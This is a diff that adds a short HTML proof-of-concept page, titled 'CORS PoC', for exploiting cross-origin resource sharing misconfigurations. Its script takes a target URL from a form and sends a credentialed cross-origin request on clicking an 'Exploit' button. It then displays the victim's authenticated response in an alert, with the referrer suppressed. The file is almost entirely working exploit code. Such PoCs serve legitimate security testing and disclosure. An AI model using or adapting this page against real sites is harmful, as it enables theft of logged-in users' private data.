@@ -1,0 +1,27 @@
+<html>
+     <head><meta name="referrer" content="no-referrer"></head>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <form>
+                 <label for="url">Enter website URL:</label><br>
+                 <input type="text" id="url" name="url"><br><br>
+                 <button type="button" onclick="cors()">Exploit</button>
+             </form>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       document.getElementById("url").value, true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
